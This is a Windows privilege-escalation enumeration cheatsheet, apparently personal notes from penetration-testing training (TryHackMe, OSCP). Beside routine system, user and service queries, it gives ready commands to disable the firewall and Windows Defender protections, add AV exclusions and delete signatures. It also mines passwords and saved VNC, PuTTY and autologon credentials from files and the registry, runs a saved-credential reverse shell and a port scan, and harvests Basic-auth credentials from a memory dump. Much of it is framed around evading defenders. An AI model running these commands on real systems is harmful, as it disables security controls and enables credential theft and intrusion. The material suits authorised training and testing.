# Windows Privilege Escalation Enumeration

This article contain manual enumeration commands and methods to potential find a a vector of escalation. For vectors of privilege escalation see [[Windows-Privilege-Escalation-Vectors]]. This cheatsheet is the culmination of everything interesting for enumeration, even the old and deprecated, with tips and tricks - where the entire document discourse is linear in procedure not alphabetical or standard, i.e: check if AV or there are honeypotting before we run `whoami` by default. We are the information we consume and if that information is not reflective of actuality of operatal integrity you have already lost by design. Real World Privilege Escalation is caveated by the potential defenses :
- AV
	- [[ASMI]]
	- [[AMSI-Bypassing]]
	- [[Antivirus-Evasion]]
- Jails
	- [[Windows-Privilege-Escalation Bypassing-Contrained-Powershell]]
- Honeypotting of all kinds
- Monitoring 
- EDR 
	- [[EDR]] 
	- [[EDR-Bypass]]
Before we alert the Blue Team or User...

For Manual Enumeration see (Again) [[Windows-Privilege-Escalation-Enumeration]]
For [[Windows-File-Transfers]]
For [[WMI-Commands]]
For [[Windows-Commands]]
For [[PrivEsc-Important-Windows-Locations]]
For [[Powershell-Versions]]
For [[Kali-Windows-Resources]] for selection of binaries and such to transfer if you have no idea!
For Powershell Bypassing see [[Windows-Privilege-Escalation Bypassing-Contrained-Powershell]]
For ASMI bypassing [[AMSI-Bypassing]]
For Working List on [[Windows-Privilege-Escalation-Scripts-And-Tools]]

## Note

After initial access dance. Stop. Wait a number of seconds for doing anything. Remind yourself of:
- Objectives, objectives, objectives.
- Not short-term, but Long-term


## Host Sercurity Enumeration

[[Windows-Privilege-Escalation Bypassing-Contrained-Powershell]], [[AMSI-Exploitation]]
```powershell
$ExecutionContext.SessionState.LanguageMode # Contrained langauage mode?
$str = 'amsiinitfailed' # Is Amsi up?
# AV Whitelisted  
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
# Check commands if in limited shell
get-command # Then get-alias
# powershell version
$PSVersionTable.PSVersion
```
Check locations for old [[Powershell-Versions]]

[`GetCimInstance`](https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/get-ciminstance?view=powershell-7.2) maybe configured to not be avaliable for non-users, but may end up needing them to pivot through a network after inital Privilege Escalation.

Firewall enumeration powershell
```powershell
Get-NetFirewallProfile | Format-Table Name, Enabled
# Tear down the WALL
Set-NetFirewallProfile -Profile Domain, Public, Private -Enable False
# Show rules
Get-NetfirewallRule | select Display, Enabled, Description
```
and with cmd.exe:
```powershell
netsh advfirewall firewall dump
# or 
netsh firewall show state
netsh firewall show config
# advfirewall
netsh advfirewall firewall show rule name=all
```
Testing a firewall from the inside:
```powershell
Test-NetConnection -ComputerName 127.0.0.1 -Port 80
```

List all block ports by firewall
```powershell
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
```

Disabling firewall
```powershell
# Disable Firewall on Windows 7 via cmd
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Disable Firewall on Windows 7 via Powershell
powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value'`

# Disable Firewall on any windows via cmd
netsh firewall set opmode disable
netsh Advfirewall set allprofiles state off
```

Eventlogs sometimes provide an insight into applications and services, security or otherwise
```powershell 
Get-EventLog -List
```

Windows Defender
```powershell 
# Check Windows Defender Status
Get-MpComputerStatus

Get-Service WinDefend
# Check Windows Defender Enabled but have
Get-MpComputerStatus | Select RealTimeProtectionEnabled 
Set-MpPreference -DisableRealtimeMonitoring $true

# Registry Key
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender

sc stop WinDefend
sc start WinDefend

# check status of Defender
PS C:\> Get-MpComputerStatus

# disable scanning all downloaded files and attachments, disable AMSI (reactive)
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true

# disable AMSI (set to 0 to enable)
PS C:\> Set-MpPreference -DisableScriptScanning 1 

# exclude a folder
PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
PS C:\> Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"

# remove signatures (if Internet connection is present, they will be downloaded again):
PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

AV
```powershell
wmic / :\\ \  path antivirusproduct
Get-CimInstance -Namespace <name/space> -ClassName AntivirusProduct
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
```

Sysmon Enumeration
```powershell
Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
Get-Service | where-object {$_.DisplayName -like "*sysm*"}
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon\Operational
```
If you find Sysmon, find the config file.
```powershell
 findstr /si '<ProcessCreate onmatch="exclude">' C:\* # BEWARE recursive searching!
```

AppLocker
```powershell
# List AppLocker Rules
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
# Test AppLocker Policy
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```


## General System Enumeration
```powershell
# Windows version
ver                            
# Evasive way of systeminfo
echo %PROCESSOR_ARCHITECTURE%  
# List system information
# System Boot Time and Os Version - patch level
systeminfo
# pwsh version of systeminfo
get-computerinfo           
hostname
# WMI 
# QFE = Quick Fix Engineering
wmic qfe
wmic qfe get Caption,Description,HotFixId,InstalledOn           # Patch level!
wmic qfe list                  # LIST patch history!!!
# powershell version
$PSVersionTable.PSVersion
```
Hotfix levels
```powershell
get-hotfix
get-hotfix | format-list | findstr InstalledOn
get-hotfix | format-table hotfixid
get-hotfix -ID  # specific information
get-hotfix | ft -AutoSize

# WMIC
wmic product get name, version, vendor
wmic qfe get Caption, Description, HotFixID, InstalledOn
```
Device Driver and Kernel Modules Queries
```powershell
driverquery
sc query windefend # requires NAME use get-ciminstance here for memory
sc queryex type=service
get-ciminstance -namespace root/securitycenter2 -classname antivirusproduct

driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path

Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*$SOMETHING*"}
```

```powershell
# install Programs
wmic product get name
# pwsh version
Get-WmiObject -Class Win32_Product |  select Name, Version
```



RELOCATING:
```
# Drives!
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## Network Enumeration
```powershell
Get-NetComputer -ping
# Check dns server, Internal network
ipconfig /all                                    
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft

# -a displays all active connections, -n prevents name resolution, -o display the pid for each connection
netstat -ano 

# ARP Table - what connections via IPv4 
arp -a
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State

# Network shares
net share
powershell Find-DomainShare -ComputerDomain domain.local

# List routing table
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex

# SNMP Configuration
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse

1..15 | %(echo "10.10.10.$_"; ping -n 1 10.10.10.$_ | Select-String tt1)         # ip ping sweep 
1..1024 | %(echo ((New-Object Net.Sockets.TcpCLient).Connect("10.10.10.10", $_)) "Open port on - $_" 2>$null # Port scan
```
Shares utiliizing Home directories have [Roaming Profiles](https://docs.microsoft.com/en-us/windows-server/storage/folder-redirection/folder-redirection-rup-overview) - your bad stuff comes too!

DNS Zone Transfer with `nslookup` for Domain information
```powershell
nslookup.exe
>server IP 
>ls -d domainname.com
```

## User and Group Enumeration

Consider custom [[Windows-Accounts]] and [[Windows-Groups]]
```powershell
echo %USERNAME%
# whoami is a common booby-trap!
# adminstrative cmd.exe affect informational disclosure
whoami /all
whoami /priv
whoami /groups
# net command is a common booby-trap!
net
# Logon requirements, Password policy
net account 
# %USERNAME%_adm and %USERNAME% could have credential reuse.
# Get all users
net user # "" insert user name if required with quotes 
# Non-standard groups can be misconfigured
net localgroup # List all 
net localgroup administrators #specify
net group "administrators" /domain
# Powerview:
get-netuser | out-gridview
get-netuser | select -expandproperty lastlogon
(Get-NetUser).name
# Powershell
Get-LocalUser -Name "Administrator" | Select Name,SID
# Who is logged in and what session type do they have:
query user
query user /server:$SERVER

# Users Sessions
quser
qwinsta 
```
[[SePrivilege-Token-Table]]


## ConsoleHost history file:
```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

(Get-PSReadlineOption).HistorySavePath
```

## Filesystem Enumeration

Consider reviewing important Windows Locations: [[PrivEsc-Important-Windows-Locations]] - 

Find those credentials and misconfigured permissions (these are real 0days!)
```powershell
# Critical in find insecurity in file system and chain vectors
icacls $dirsAndFilesAndEVERYTHING # Permissions are everything
# Legacy "icankles"
cacls

dir /A                         # Hidden files, never use just dir  
ls -hidden
Get-ChildItem -Hidden -Path    # String in hidden files 
findstr /si string *.extension # find patterns from current directory and recursively
Get-ChildItem -Path C:\ -Include *.doc,*.[FILETYPE] -File -Recurse -ErrorAction SilentlyContinue # Find files with powershell

dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
# Find unattended install files
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul

findstr /si password *.xml *.ini *.txt *.config
# Find xampp custom sensitive files
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
# Find KeePass database files
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
# Find all the documents
Get-ChildItem -Path $PATH -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

For some reason you are stuck on without exfiltrating file to use `strings` windows - without encoders [REF](https://superuser.com/questions/124081/is-there-a-windows-equivalent-of-the-unix-strings-command) - almost certianly not opsec safe, but quick. 
```powershell
more < FILE_PATH.exe | findstr "."
more < FILE_PATH.exe | findstr "." > C:\programdata\stringsOfFile.txt
```

#### Insecure World Writable Files and Directories 

**THIS IS FREQUENT CHAINING OF INSECURITIES - OWNSHIP AND INTERACTABILITY ARE CRITICAL TO EVERYTHING ICACLS IS YOU BEST FRIEND**
You are looking for with  `icacls` either a directory or tree of directories due to Windows Pathing for locating executables:
- Write/Add file
- Delete permission + search path or anywhere else on search path. 
```powershell
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
# (cacls for older versions of Windows)
cacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"

Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
# Sysinternals
accesschk.exe -uws "Everyone" "C:\Program Files"
accesschk.exe -uwdqs "Users" "c:\*" /accepteula
```

## Services and Processes

- Consider security context of:
	- What is running
	- Who is owns it
	- Where and how the filesystem around where it running from is configured

*An [access-tokens](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens) is an object that describes the [security context](https://learn.microsoft.com/en-us/windows/desktop/SecGloss/s-gly) of a [process](https://learn.microsoft.com/en-us/windows/desktop/SecGloss/p-gly) or thread. The information in a token includes the identity and privileges of the user account associated with the process or thread.* 

*Any process can access [named pipes](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes), subject to security checks, making named pipes an easy form of communication between related or unrelated processes.* 
```powershell
# Processes 
# Running services
tasklist /svc

tasklist /v /fi "username eq system"
# list all processes and dlls
tasklist /m                    
# added Paths to this Hacktrick oneliner, because why would not want the path.. 
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id, Path

wmic service where "name like 'InsecureProcess'" get Name, PathName


# Network Service Enumeration
netstat -noa |findstr "LISTENING"|findstr "<ProcessID>"
get-service
restart-service

# Listening Network Processes!
netstat -ano 

# Scheduled tasks
get-scheduledtask | findstr /v Disabled

# List Named Pipes 
gci \\.\pipe\
# sysinternals
pipelist accepteula
# lsass named pipe permissions
accesschk.exe /accepteula \\.\Pipe\lsass -v
accesschk.exe -accepteula -w \pipe\* -v

# List a Service with the Registry 
set-location 'HKLM:\SYSTEM\CurrentControlSet\Services'
get-childitem . # gci .
get-childitem . | select name
get-childitem . | where-object { $_.Name -like '*<PUT YOUR SERVICE YOU ARE LOOKING FOR HERE>*'}

# Remove service dependceny
sc config $service depend= ""
```
List interesting services, but not the services associated
- [Session Manager Subsystem (smss.exe)](https://en.wikipedia.org/wiki/Session_Manager_Subsystem)
- [Client Server Runtime Subsystem (csrss.exe)](https://en.wikipedia.org/wiki/Client/Server_Runtime_Subsystem)
- [WinLogon (winlogon.exe)](https://en.wikipedia.org/wiki/Winlogon)
- [Local Security Authority Subsystem Service (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)
- [Service Host (svchost.exe)](https://en.wikipedia.org/wiki/Svchost.exe)
- [Windows Defender (MsMpEng.exe)](https://en.wikipedia.org/wiki/Microsoft_Defender_Antivirus)

## Environment Variables
```powershell
# set and setx not are accurate
# Get ACTUAL %PATH% variables instead of set!
reg query "HKLM\System\CurrentControlSet\Session Management\Environment"
# Or some versions
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path
# if set breaks your shell or in powershell
dir env: 
# Sometimes sensistive data is stored in environment variables 
set /? # for cmd /?, but in powershell does not display help or current variables, but can set variable
# This for permanent modification to environment variables 
setx

```
Shares utiliizing Home directories have [Roaming Profiles](https://docs.microsoft.com/en-us/windows-server/storage/folder-redirection/folder-redirection-rup-overview) - your bad stuff comes too!


## Unmounted Disks
```powershell
mountvol # Requres knowlegdge - update incoming at some point
```


## WMI-Objects
```powershell
Get-WmiObject win32_useraccount | Select name,sid
gvmi win32_userprofile
#Get Computer system information
Get-WMIObject Win32_ComputerSystem
#Get Computer name from available System information
Get-WMIObject Win32_ComputerSystem| Select-Object -ExpandProperty Name
#Get Domain name from available System Information
Get-WMIObject Win32_ComputerSystem| Select-Object -ExpandProperty Domain

net localgroup # "" insert group name if required with quotes
Get-Net-Group
Get-NetGroupMember "Domain Admins"
Get-NetUsers -Domain

get-netdomaincontroller

cmdkey /list # Saved Creds!
runas /savecred /user:<user> cmd.exe
```

## Software

```powershell
get-executionpolicy -list
set-executionpolicy bypass -scope process # Change executionpolicy
wmic product get name,version,vendor
wmic service list brief
wmic service list brief | findstr  "Running"
sc qc <service>
```

Wmic available
```powershell
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt

for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
```
Wmic unavaliable
```powershell
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```

## Registry

[Registru keys]([[Windows-Registry]]) have permissions, but register values do not have permissions. Values are inheirated from keys, subkeys if value or key has control of execution of a privileged process has write permissions we run code with elevated permissions. Always perform subkey inherence check. Not very stealth more so than use Powershell, but effective.

```powershell
reg query "HKLM\System\CurrentControlSet\Session Management\Environment"
# AlwaysInstallElevated
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated"
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated"

reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"

reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v "DSA Database file"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
```

## Credentials
```powershell
# volume shadow copy service admin 
# need admin may one day be useful#
vssadmin     
```

Saved Credentials:
```powershell
cmdkey /list                                    list saved credentials
runas /savecred /user:admin reverse_shell.exe   query /savedcred
vaultcmd /list
# Web credentials, Windows credentials, Generic credentials. Certificate-based credentials
vaultcmd /listproperties:"$category" 
# Will display the number, location in AppData and protection method
vaultcmd /listcreds:"$category" # information about stored credentials
```

Credentials in the Registry
```powershell
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
# Beware alot of output!:
REG QUERY HKCU /F "password" /t REG_SZ /S /d
REG QUERY HKLM /F "password" /t REG_SZ /S /d 
# Other credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4" /v password
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
```

Autologon Credentials
```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon 
```

Password Mining Configuration Files
```powershell
# Look for Unattend.xml used by sysadmins to setup systems, should be deleted.
# Finding unquoted service path vulnerabilities
wmic service get name,displayname,pathname,startmode | Sort
#NEED A powershell command to find the unquoted path pipe
sc qc [service]        #  to query binary path service
```

Passwords in Unattended.xml
```
C:\Windows\Panther\Unattend\Unattended.xml
```

Password Mining Memory
```bash
# Attack box
msfconsole:
use auxiliary/server/capture/http_basic
set uripath x
run
```
Then on target
```powershell
# browser -> http://attackbox_address/x
# open cmd
taskmgr
# right-click iexplorer.exe of "Image Name" column
# select "Create Dump File"
# Copy file to attack box
# On attack box
strings dump.DMP | grep "Authorization: Basic"
echo -ne base64string | base64 -d
```




## References

[THM Windows PrivEsc Room](https://tryhackme.com/room/windowsprivesc20)
[THM Lay of the Land Room](https://tryhackme.com/room/thelayoftheland)
[Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)
[PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
[Wild west hackin' Fest Jake Williams - Talk: Elevating your Windows Privilege like Boss](https://www.youtube.com/watch?v=SHdM197sbIE')
[Wild west hackin' Fest Jake Williams - Talk: Privilege Escalation](https://www.youtube.com/watch?v=yXe4X-AIbps)
[Udemy - tib3rius](https://www.udemy.com/user/tib3rius/)
[Fareedfauzi](https://fareedfauzi.gitbook.io/oscp-notes/windows-post-exploitation/windows-privesc-technique)
[Session Manager Subsystem (smss.exe)](https://en.wikipedia.org/wiki/Session_Manager_Subsystem)
[Client Server Runtime Subsystem (csrss.exe)](https://en.wikipedia.org/wiki/Client/Server_Runtime_Subsystem)
[WinLogon (winlogon.exe)](https://en.wikipedia.org/wiki/Winlogon)
[Local Security Authority Subsystem Service (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)
[Service Host (svchost.exe)](https://en.wikipedia.org/wiki/Svchost.exe)
[Windows Defender (MsMpEng.exe)](https://en.wikipedia.org/wiki/Microsoft_Defender_Antivirus)
[HTB academy Windows Privilege Escalation Course](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
[Roaming Profiles](https://docs.microsoft.com/en-us/windows-server/storage/folder-redirection/folder-redirection-rup-overview) 
[WMI](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) 
[QFE (Quick Fix Engineering)](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-quickfixengineering)